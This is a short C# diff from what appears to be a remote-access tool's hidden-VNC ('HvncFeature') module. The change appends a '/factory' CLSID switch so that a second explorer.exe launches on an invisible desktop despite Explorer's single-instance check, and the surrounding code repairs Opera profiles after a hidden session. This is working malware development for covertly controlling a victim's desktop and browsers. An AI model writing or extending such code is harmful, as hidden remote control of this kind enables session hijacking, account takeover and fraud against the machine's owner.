@@ -2134,6 +2134,11 @@ internal static class HvncFeature
             // Repair real Opera / Opera GX profile JSON before launch.
             if (exeBase == "opera.exe") RepairOperaProfileAfterHvnc();
 
+            // Explorer.exe is a singleton — a second instance DDE-messages the existing one
+            // and exits immediately (ignoring lpDesktop). /factory bypasses the singleton check.
+            if (exeBase == "explorer.exe" && !cmd.Contains("/factory", StringComparison.OrdinalIgnoreCase))
+                cmd += " /factory,{90AA3A4E-1CBA-4233-B8BB-535773D48449}";
+
             var sb = new System.Text.StringBuilder(cmd);
             uint createFlags = CREATE_UNICODE_ENVIRONMENT | (isConsoleApp ? CREATE_NEW_CONSOLE : 0u);
             nint launchToken = GetLaunchToken();
